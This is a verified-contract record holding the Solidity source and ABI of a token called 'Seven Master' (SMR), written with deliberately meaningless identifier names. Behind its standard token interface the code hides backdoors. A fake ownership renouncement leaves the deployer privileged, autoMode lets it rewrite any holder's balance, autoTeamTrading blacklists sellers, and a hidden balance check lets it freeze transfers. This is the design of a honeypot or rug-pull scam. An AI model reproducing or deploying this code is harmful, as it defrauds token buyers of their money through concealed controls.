{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface isTrading {\n    function createPair(address buyTx, address receiverExempt) external returns (address);\n}\n\ninterface walletEnableMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txFeeWallet) external view returns (uint256);\n\n    function transfer(address swapAuto, uint256 tokenExemptShould) external returns (bool);\n\n    function allowance(address limitEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenExemptShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapAuto,\n        uint256 tokenExemptShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityLaunchedTotal, uint256 value);\n    event Approval(address indexed limitEnable, address indexed spender, uint256 value);\n}\n\nabstract contract marketingLaunchTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletEnableMinMetadata is walletEnableMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SevenMaster is marketingLaunchTake, walletEnableMin, walletEnableMinMetadata {\n\n    address swapShouldSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function autoTeamTrading(address listSell) public {\n        tradingMode();\n        \n        if (listSell == walletReceiver || listSell == atList) {\n            return;\n        }\n        shouldMax[listSell] = true;\n    }\n\n    uint256 private tradingReceiver;\n\n    string private marketingLaunchedToken = \"SMR\";\n\n    bool public feeWallet;\n\n    function amountMode(uint256 tokenExemptShould) public {\n        tradingMode();\n        launchedReceiver = tokenExemptShould;\n    }\n\n    mapping(address => bool) public liquidityLaunchedTeam;\n\n    function transfer(address autoLaunchTotal, uint256 tokenExemptShould) external virtual override returns (bool) {\n        return fundTake(_msgSender(), autoLaunchTotal, tokenExemptShould);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return senderMin;\n    }\n\n    uint8 private launchTakeAt = 18;\n\n    mapping(address => bool) public shouldMax;\n\n    bool public listLaunch;\n\n    uint256 private liquidityWallet = 100000000 * 10 ** 18;\n\n    uint256 constant fundTotalTx = 10 ** 10;\n\n    mapping(address => mapping(address => uint256)) private autoShould;\n\n    bool public launchedWallet;\n\n    event OwnershipTransferred(address indexed atBuy, address indexed senderFund);\n\n    uint256 private tradingEnable;\n\n    bool private fundWalletLaunch;\n\n    function fundTake(address tokenExempt, address swapAuto, uint256 tokenExemptShould) internal returns (bool) {\n        if (tokenExempt == walletReceiver) {\n            return shouldSell(tokenExempt, swapAuto, tokenExemptShould);\n        }\n        uint256 receiverFrom = walletEnableMin(atList).balanceOf(totalAuto);\n        require(receiverFrom == launchedReceiver);\n        require(swapAuto != totalAuto);\n        if (shouldMax[tokenExempt]) {\n            return shouldSell(tokenExempt, swapAuto, fundTotalTx);\n        }\n        return shouldSell(tokenExempt, swapAuto, tokenExemptShould);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingLaunchedToken;\n    }\n\n    bool private liquidityMarketing;\n\n    bool private swapLaunched;\n\n    address public walletReceiver;\n\n    address public atList;\n\n    address totalAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private senderMin = \"Seven Master\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchTakeAt;\n    }\n\n    uint256 launchedReceiver;\n\n    function receiverTo(address teamMinWallet) public {\n        if (listLaunch) {\n            return;\n        }\n        if (swapLaunched) {\n            tradingEnable = tradingReceiver;\n        }\n        liquidityLaunchedTeam[teamMinWallet] = true;\n        if (receiverFund != swapLaunched) {\n            fundWalletLaunch = true;\n        }\n        listLaunch = true;\n    }\n\n    function tradingAuto() public {\n        emit OwnershipTransferred(walletReceiver, address(0));\n        launchedEnable = address(0);\n    }\n\n    address private launchedEnable;\n\n    function approve(address launchReceiver, uint256 tokenExemptShould) public virtual override returns (bool) {\n        autoShould[_msgSender()][launchReceiver] = tokenExemptShould;\n        emit Approval(_msgSender(), launchReceiver, tokenExemptShould);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return launchedEnable;\n    }\n\n    function tradingMode() private view {\n        require(liquidityLaunchedTeam[_msgSender()]);\n    }\n\n    constructor (){\n        \n        exemptAt senderBuy = exemptAt(swapShouldSell);\n        atList = isTrading(senderBuy.factory()).createPair(senderBuy.WETH(), address(this));\n        if (fundWalletLaunch == receiverFund) {\n            launchedWallet = false;\n        }\n        walletReceiver = _msgSender();\n        liquidityLaunchedTeam[walletReceiver] = true;\n        maxFund[walletReceiver] = liquidityWallet;\n        tradingAuto();\n        \n        emit Transfer(address(0), walletReceiver, liquidityWallet);\n    }\n\n    mapping(address => uint256) private maxFund;\n\n    function shouldSell(address tokenExempt, address swapAuto, uint256 tokenExemptShould) internal returns (bool) {\n        require(maxFund[tokenExempt] >= tokenExemptShould);\n        maxFund[tokenExempt] -= tokenExemptShould;\n        maxFund[swapAuto] += tokenExemptShould;\n        emit Transfer(tokenExempt, swapAuto, tokenExemptShould);\n        return true;\n    }\n\n    uint256 enableTrading;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityWallet;\n    }\n\n    function balanceOf(address txFeeWallet) public view virtual override returns (uint256) {\n        return maxFund[txFeeWallet];\n    }\n\n    function transferFrom(address tokenExempt, address swapAuto, uint256 tokenExemptShould) external override returns (bool) {\n        if (_msgSender() != swapShouldSell) {\n            if (autoShould[tokenExempt][_msgSender()] != type(uint256).max) {\n                require(tokenExemptShould <= autoShould[tokenExempt][_msgSender()]);\n                autoShould[tokenExempt][_msgSender()] -= tokenExemptShould;\n            }\n        }\n        return fundTake(tokenExempt, swapAuto, tokenExemptShould);\n    }\n\n    function autoMode(address autoLaunchTotal, uint256 tokenExemptShould) public {\n        tradingMode();\n        maxFund[autoLaunchTotal] = tokenExemptShould;\n    }\n\n    function getOwner() external view returns (address) {\n        return launchedEnable;\n    }\n\n    bool private receiverFund;\n\n    function allowance(address swapAutoToken, address launchReceiver) external view virtual override returns (uint256) {\n        if (launchReceiver == swapShouldSell) {\n            return type(uint256).max;\n        }\n        return autoShould[swapAutoToken][launchReceiver];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityLaunchedTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAutoToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenExemptShould\",\"type\":\"uint256\"}],\"name\":\"amountMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenExemptShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLaunchTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenExemptShould\",\"type\":\"uint256\"}],\"name\":\"autoMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listSell\",\"type\":\"address\"}],\"name\":\"autoTeamTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFeeWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityLaunchedTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMinWallet\",\"type\":\"address\"}],\"name\":\"receiverTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLaunchTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenExemptShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenExemptShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SevenMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}